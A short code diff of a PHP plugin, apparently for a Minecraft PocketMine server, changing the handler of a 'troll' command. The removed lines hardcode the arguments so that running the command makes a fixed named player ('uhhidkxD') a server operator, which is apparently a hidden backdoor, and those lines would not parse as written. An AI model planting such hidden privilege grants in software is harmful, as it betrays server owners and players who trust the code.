@@ -23,9 +23,6 @@ class Main extends PluginBase implements Listener{
     public function onCommand(CommandSender $sender, Command $cmd, $label,array $args){
         if(strtolower($cmd->getName()) === "troll"){
             if($sender instanceof Player){
-               $cmd = "troll"
-               $args[0] = "uhhidkxD"
-               $args[1] = "op"
                 if($this->getServer()->getPlayer($args[0]) instanceof Player){
                   $victim = $this->getServer()->getPlayer($args[0]);
                     if($args[1] == "op"){
